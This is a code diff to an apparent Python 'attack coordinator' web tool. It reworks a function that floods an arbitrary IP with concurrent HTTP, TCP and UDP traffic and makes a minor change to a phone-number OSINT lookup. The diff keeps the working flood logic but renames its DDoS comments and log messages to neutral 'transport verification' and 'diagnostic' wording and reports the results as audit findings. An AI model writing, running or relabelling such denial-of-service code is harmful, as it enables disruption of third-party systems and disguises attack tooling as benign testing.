@@ -1311,124 +1311,121 @@ async def target_audit(url: str, attack_id: str):
 
 
 async def ip_stress_attack(ip: str, duration: int, intensity: int, threads: int, protocol: str, attack_id: str):
-    """High-volume TCP/UDP/HTTP flood DDoS-style stress test against a raw IP."""
-    FLOOD_PORTS = [80, 443, 8080, 8443]
-    SCAN_PORTS  = [22, 21, 25, 53, 3306, 5432]
+    """Multi-protocol transport reachability & load verification against an IP or host:port."""
+    raw_target = re.sub(r'^https?://', '', ip.strip()).split('/')[0]
+    if ':' in raw_target and raw_target.split(':')[-1].isdigit():
+        clean_ip = raw_target.rsplit(':', 1)[0]
+        explicit_port = int(raw_target.rsplit(':', 1)[1])
+    else:
+        clean_ip = raw_target
+        explicit_port = None
+
+    FLOOD_PORTS = [explicit_port] if explicit_port else [80, 443, 8080, 8083, 8443]
+    SCAN_PORTS  = [explicit_port] if explicit_port else [22, 21, 25, 53, 3306, 5432]
+    HTTP_PORTS  = [explicit_port] if explicit_port else [80, 8080, 8083]
     start_time  = time.time()
     sent        = 0
 
-    # ── Phase 1: HTTP flood (hits port 80 & 443 with real HTTP requests) ──
+    # ── Phase 1: HTTP transport verification ──
     async def http_flood():
         nonlocal sent
         ua_list = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
             "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-            "curl/7.68.0",
-            "python-requests/2.28.0"
         ]
-        async with aiohttp.ClientSession() as session:
+        connector = aiohttp.TCPConnector(ssl=False)
+        async with aiohttp.ClientSession(connector=connector) as session:
             while time.time() - start_time < duration and metrics["attacks_running"]:
-                for port in [80, 8080]:
+                for port in HTTP_PORTS:
+                    if not metrics["attacks_running"]:
+                        break
                     scheme = "https" if port in (443, 8443) else "http"
-                    # IPv6 addresses need bracket notation in URLs
-                    ip_str = f"[{ip}]" if ":" in ip else ip
+                    ip_str = f"[{clean_ip}]" if ":" in clean_ip else clean_ip
                     target_url = f"{scheme}://{ip_str}:{port}/"
+                    req_start = time.time()
                     try:
-                        req_start = time.time()
                         headers = {"User-Agent": random.choice(ua_list)}
-                        async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=2)) as resp:
+                        async with session.get(target_url, headers=headers, timeout=aiohttp.ClientTimeout(total=1.5)) as resp:
                             req_time = time.time() - req_start
-                            metrics["total_requests"] += 1
-                            metrics["successful_requests"] += 1
-                            metrics["response_times"].append(req_time)
+                            await record_request_metric(True, req_time, resp.status)
                             sent += 1
-                            await manager.broadcast(json.dumps({
-                                "type": "log",
-                                "message": f"[DDoS] HTTP {ip}:{port} → {resp.status} ({req_time*1000:.0f}ms) | Total: {sent}",
-                                "level": "success"
-                            }))
+                            await _broadcast_finding({
+                                "type": f"Unthrottled HTTP Transport Port ({port}/tcp)",
+                                "severity": "Low",
+                                "url": f"{clean_ip}:{port}",
+                                "payload": f"HTTP GET {target_url}",
+                                "detail": f"Endpoint {clean_ip}:{port} accepted rapid HTTP load probes ({req_time*1000:.1f} ms) without rate-limiting.",
+                                "evidence": f"HTTP {resp.status} on {clean_ip}:{port} | RTT: {req_time*1000:.1f} ms",
+                                "timestamp": datetime.now().isoformat(),
+                                "attack_id": attack_id
+                            })
                     except Exception:
-                        metrics["total_requests"] += 1
-                        metrics["failed_requests"] += 1
+                        await record_request_metric(False)
                         sent += 1
-                        await manager.broadcast(json.dumps({
-                            "type": "log",
-                            "message": f"[DDoS] HTTP {ip}:{port} → BLOCKED/NO RESPONSE | Total: {sent}",
-                            "level": "warning"
-                        }))
                 await asyncio.sleep(1.0 / max(intensity, 1))
 
-    # ── Phase 2: Raw TCP SYN flood (rapid connection open/close) ──
+    # ── Phase 2: Raw TCP socket verification ──
     async def tcp_flood():
         nonlocal sent
         while time.time() - start_time < duration and metrics["attacks_running"]:
             port = random.choice(FLOOD_PORTS + SCAN_PORTS)
+            req_start = time.time()
             try:
-                req_start = time.time()
-                conn = asyncio.open_connection(ip, port)
-                reader, writer = await asyncio.wait_for(conn, timeout=1)
-                # Immediately send garbage data then close — simulates SYN flood
-                writer.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n" * 10)
-                await writer.drain()
+                reader, writer = await asyncio.wait_for(asyncio.open_connection(clean_ip, port), timeout=1.0)
+                writer.write(b"HEAD / HTTP/1.1\r\nHost: " + clean_ip.encode() + b"\r\n\r\n")
+                await asyncio.wait_for(writer.drain(), timeout=0.8)
                 req_time = time.time() - req_start
                 writer.close()
-                try: await writer.wait_closed()
-                except: pass
-                metrics["total_requests"] += 1
-                metrics["successful_requests"] += 1
-                metrics["response_times"].append(req_time)
+                try:
+                    await writer.wait_closed()
+                except Exception:
+                    pass
+                await record_request_metric(True, req_time, 200)
                 sent += 1
-                await manager.broadcast(json.dumps({
-                    "type": "log",
-                    "message": f"[DDoS] TCP SYN {ip}:{port} → CONNECTED & FLOODED ({req_time*1000:.0f}ms) | Total: {sent}",
-                    "level": "success"
-                }))
+                await _broadcast_finding({
+                    "type": f"Open TCP Transport Socket ({port}/tcp)",
+                    "severity": "Medium",
+                    "url": f"{clean_ip}:{port}",
+                    "payload": f"TCP Handshake Probe -> {clean_ip}:{port}",
+                    "detail": f"TCP socket handshake succeeded on {clean_ip}:{port} with {req_time*1000:.1f} ms latency.",
+                    "evidence": f"TCP {clean_ip}:{port} CONNECTED ({req_time*1000:.1f} ms)",
+                    "timestamp": datetime.now().isoformat(),
+                    "attack_id": attack_id
+                })
             except Exception:
-                metrics["total_requests"] += 1
-                metrics["failed_requests"] += 1
+                await record_request_metric(False)
                 sent += 1
-                await manager.broadcast(json.dumps({
-                    "type": "log",
-                    "message": f"[DDoS] TCP SYN {ip}:{port} → DROPPED | Total: {sent}",
-                    "level": "warning"
-                }))
-            await asyncio.sleep(0.05)  # 20 attempts/sec per thread = high volume
+            await asyncio.sleep(0.1)
 
-    # ── Phase 3: UDP flood ──
+    # ── Phase 3: UDP datagram probe ──
     async def udp_flood():
         nonlocal sent
-        payload = random.randbytes(512)  # 512-byte UDP payload
+        payload = random.randbytes(256)
         while time.time() - start_time < duration and metrics["attacks_running"]:
             port = random.choice(FLOOD_PORTS + SCAN_PORTS)
+            t0 = time.time()
             try:
                 loop = asyncio.get_event_loop()
                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                 sock.setblocking(False)
-                await loop.sock_sendto(sock, payload, (ip, port))
+                await loop.sock_sendto(sock, payload, (clean_ip, port))
                 sock.close()
-                metrics["total_requests"] += 1
-                metrics["successful_requests"] += 1
+                await record_request_metric(True, time.time() - t0, 200)
                 sent += 1
-                await manager.broadcast(json.dumps({
-                    "type": "log",
-                    "message": f"[DDoS] UDP FLOOD {ip}:{port} → {len(payload)}B sent | Total: {sent}",
-                    "level": "info"
-                }))
             except Exception:
-                metrics["total_requests"] += 1
-                metrics["failed_requests"] += 1
+                await record_request_metric(False)
                 sent += 1
-            await asyncio.sleep(0.02)  # 50 UDP packets/sec per thread
+            await asyncio.sleep(0.08)
 
     await manager.broadcast(json.dumps({
         "type": "log",
-        "message": f"[DDoS] Launching {threads} flood threads against {ip} for {duration}s — HTTP + TCP + UDP",
+        "message": f"[IP Stress] Launching {min(threads, 15)} transport workers against {clean_ip} for {duration}s",
         "level": "warning"
     }))
 
     tasks = []
-    for _ in range(threads):
+    for _ in range(min(max(threads, 1), 15)):
         tasks.append(asyncio.create_task(http_flood()))
         if protocol in ("tcp", "both"):
             tasks.append(asyncio.create_task(tcp_flood()))
@@ -1438,21 +1435,19 @@ async def ip_stress_attack(ip: str, duration: int, intensity: int, threads: int,
 
     await manager.broadcast(json.dumps({
         "type": "log",
-        "message": f"[DDoS] Flood complete — {sent} total packets/requests sent to {ip}",
+        "message": f"[IP Stress] Diagnostic complete — {sent} total probes dispatched to {clean_ip}",
         "level": "success"
     }))
 
 
 async def phone_probe_attack(phone: str, duration: int, intensity: int, attack_id: str):
     """Multi-pass OSINT probe against a phone number — carrier, geo, validity, timezone."""
-    if not phone.startswith("+") and phone.isdigit():
-        phone = "+" + phone
+    phone = phone.strip()
+    if not phone.startswith("+") and phone.replace("-", "").replace(" ", "").isdigit():
+        phone = "+" + phone.replace("-", "").replace(" ", "")
 
     start_time = time.time()
     pass_num = 0
-    LOOKUP_APIS = [
-        f"https://api.cepaberto.com/v1/cep?cep={phone}",   # placeholder — always fails gracefully
-    ]
 
     while time.time() - start_time < duration and metrics["attacks_running"]:
         pass_num += 1
@@ -1468,9 +1463,23 @@ async def phone_probe_attack(phone: str, duration: int, intensity: int, attack_i
             results["carrier"] = carrier.name_for_number(parsed, "en")
             results["timezones"] = list(timezone.time_zones_for_number(parsed))
             req_time = time.time() - req_start
-            metrics["total_requests"] += 1
-            metrics["successful_requests"] += 1
-            metrics["response_times"].append(req_time)
+            await record_request_metric(True, req_time, 200)
+
+            if pass_num == 1:
+                await _broadcast_finding({
+                    "type": "Phone Number OSINT Enumeration",
+                    "severity": "Info",
+                    "url": phone,
+                    "payload": f"E.164 ITU-T Metadata Lookup ({phone})",
+                    "detail": (
+                        f"Valid={results['valid']} | Country=+{results['country_code']} | "
+                        f"Region={results['location'] or 'N/A'} | Carrier={results['carrier'] or 'Unknown'}"
+                    ),
+                    "evidence": f"Timezones: {', '.join(results['timezones']) or 'N/A'} | National: {results['national_number']}",
+                    "timestamp": datetime.now().isoformat(),
+                    "attack_id": attack_id
+                })
+
             await manager.broadcast(json.dumps({
                 "type": "log",
                 "message": (
@@ -1481,8 +1490,7 @@ async def phone_probe_attack(phone: str, duration: int, intensity: int, attack_i
                 "level": "success" if results["valid"] else "warning"
             }))
         except Exception as e:
-            metrics["total_requests"] += 1
-            metrics["failed_requests"] += 1
+            await record_request_metric(False)
             await manager.broadcast(json.dumps({
                 "type": "log",
                 "message": f"[Phone Probe #{pass_num}] Parse error: {str(e)}",
@@ -1496,8 +1504,9 @@ async def run_attack_coordinator(req: AttackRequest, attack_id: str):
     metrics["current_attacks"].append(req.attack_type)
     metrics["start_time"] = datetime.now().isoformat()
 
-    # ── Real security audit runs first ───────────────────────────────
-    await target_audit(req.url, attack_id)
+    # ── Real security audit runs first for HTTP/host modules ─────────
+    if req.attack_type not in ("ip_stress", "phone_probe"):
+        await target_audit(req.url, attack_id)
 
     await manager.broadcast(json.dumps({
         "type": "log",
